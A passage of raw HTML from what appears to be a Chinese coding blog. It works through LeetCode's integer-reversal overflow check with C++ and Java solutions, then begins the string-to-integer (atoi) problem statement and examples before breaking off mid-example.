class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span></span></span></span></p><p>讨论该不等式成立的条件：</p><p>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>&gt;</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}&gt;\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span>，由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\textit{digit}\ge0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，不等式不成立。<br>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>=</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}=\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span>，当且仅当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext><mo>≤</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">\textit{digit}\le7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 时，不等式成立。<br>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>&lt;</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}&lt;\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span>，由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext><mo>≤</mo><mn>9</mn></mrow><annotation encoding="application/x-tex">\textit{digit}\le9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span>，不等式成立。</p><p>注意到当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>=</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}=\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span> 时若还能推入数字，则说明 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的位数与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">INT_MAX</mtext></mrow><annotation encoding="application/x-tex">\textit{INT\_MAX}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span> 的位数相同，且要推入的数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext></mrow><annotation encoding="application/x-tex">\textit{digit}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的最高位。由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">INT_MAX</mtext></mrow><annotation encoding="application/x-tex">\textit{INT\_MAX}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span>，因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext></mrow><annotation encoding="application/x-tex">\textit{digit}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span></span></span></span> 不会超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">INT_MAX</mtext></mrow><annotation encoding="application/x-tex">\textit{INT\_MAX}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span> 的最高位，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">digit</mtext><mo>≤</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">\textit{digit}\le2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>。所以实际上当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>=</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}=\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span> 时不等式必定成立。</p><p>因此判定条件可简化为：当且仅当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>≤</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\textit{rev}\le\lfloor\cfrac{\textit{INT\_MAX}}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌋</span></span></span></span> 时，不等式成立。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&lt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&lt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的情况类似，留给读者自证，此处不再赘述。</p><p>综上所述，判断不等式</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo>≤</mo><mtext mathvariant="italic">rev</mtext><mo>⋅</mo><mn>10</mn><mo>+</mo><mtext mathvariant="italic">digit</mtext><mo>≤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-2^{31}\le\textit{rev}\cdot10+\textit{digit}\le2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>是否成立，可改为判断不等式</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌉</mo><mo>≤</mo><mtext mathvariant="italic">rev</mtext><mo>≤</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lceil\cfrac{-2^{31}}{10}\rceil\le\textit{rev}\le\lfloor\dfrac{2^{31}-1}{10}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.276em;vertical-align:-0.686em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1771em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p><p>是否成立，若不成立则返回 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>作者：LeetCode-Solution</p></blockquote><p>妙妙妙 ~ 这样分析下来，就用很少的代码解决了问题。</p><p>现在用 C++ 实现一遍：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(n &lt; INT_MIN / <span class="number">10</span> || n &gt; INT_MAX / <span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            n = n * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>0 ms</strong></p></li><li><p>内存消耗: <strong>5.8 MB</strong></p></li></ul><p>同样练习一下 Java 来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(n &lt; Integer.MIN_VALUE / <span class="number">10</span> || n &gt; Integer.MAX_VALUE / <span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            n = n * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>0 ms</strong></p></li><li><p>内存消耗: <strong>35.7 MB</strong></p></li></ul><h2 id="8-字符串转换整数-atoi"><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h2><p>难度：中等</p><p>请你来实现一个 <code>myAtoi(string s)</code> 函数，使其能将字符串转换成一个 32 位有符号整数（类似 C/C++ 中的 <code>atoi</code> 函数）。</p><p>函数 <code>myAtoi(string s)</code> 的算法如下：</p><ul><li>读入字符串并丢弃无用的前导空格</li><li>检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 如果两者都不存在，则假定结果为正。</li><li>读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。</li><li>将前面步骤读入的这些数字转换为整数（即，“123” -&gt; 123， “0032” -&gt; 32）。如果没有读入数字，则整数为 <code>0</code> 。必要时更改符号（从步骤 2 开始）。</li><li>如果整数数超过 32 位有符号整数范围 <code>[−231, 231 − 1]</code> ，需要截断这个整数，使其保持在这个范围内。具体来说，小于 <code>−231</code> 的整数应该被固定为 <code>−231</code> ，大于 <code>231 − 1</code> 的整数应该被固定为 <code>231 − 1</code> 。</li><li>返回整数作为最终结果。</li></ul><p><strong>注意：</strong></p><ul><li>本题中的空白字符只包括空格字符 <code>' '</code> 。</li><li>除前导空格或数字后的其余字符串外，<strong>请勿忽略</strong> 任何其他字符。</li></ul><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;42&quot;</span><br><span class="line">输出：42</span><br><span class="line">解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。</span><br><span class="line">第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line">         ^</span><br><span class="line">第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）</span><br><span class="line">         ^</span><br><span class="line">第 3 步：&quot;42&quot;（读入 &quot;42&quot;）</span><br><span class="line">           ^</span><br><span class="line">解析得到整数 42 。</span><br><span class="line">由于 &quot;42&quot; 在范围 [-231, 231 - 1] 内，最终结果为 42 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;   -42&quot;</span><br><span class="line">输出：-42</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;   -42&quot;（读入前导空格，但忽视掉）</span><br><span class="line">            ^</span><br><span class="line">第 2 步：&quot;   -42&quot;（读入 &#x27;-&#x27; 字符，所以结果应该是负数）</span><br><span class="line">             ^</span><br><span class="line">第 3 步：&quot;   -42&quot;（读入 &quot;42&quot;）</span><br><span class="line">               ^</span><br><span class="line">解析得到整数 -42 。</span><br><span class="line">由于 &quot;-42&quot; 在范围 [-231, 231 - 1] 内，最终结果为 -42 。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;4193 with words&quot;</span><br><span class="line">输出：4193</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;4193 with words&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line">         ^</span><br><span class="line">第 2 步：&quot;4193 with words&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）</span><br><span class="line">         ^</span><br><span class="line">第 3 步：&quot;4193 with words&quot;（读入 